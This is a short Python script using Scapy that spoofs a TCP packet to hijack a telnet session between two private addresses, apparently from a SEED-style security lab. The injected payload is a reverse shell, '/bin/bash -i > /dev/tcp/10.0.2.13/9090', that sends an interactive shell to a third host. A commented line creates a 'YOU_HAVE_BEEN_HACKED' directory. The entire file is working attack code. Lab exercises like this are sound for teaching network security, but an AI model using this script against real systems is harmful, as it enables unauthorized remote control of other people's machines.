#!/usr/bin/python3
import sys
from scapy.all import *

print("Sending spoofed packet to hijack session")

ip = IP(src="10.0.2.16", dst="10.0.2.15")
tcp = TCP(sport=33352, dport=23, flags="A",
seq=2341471302, ack=1648993519)
#data = "\r mkdir /home/seed/YOU_HAVE_BEEN_HACKED\r"
data = "\r /bin/bash -i > /dev/tcp/10.0.2.13/9090 0<&1 2>&1 \r"
pkt = ip/tcp/data
ls(pkt)
send(pkt,verbose=0)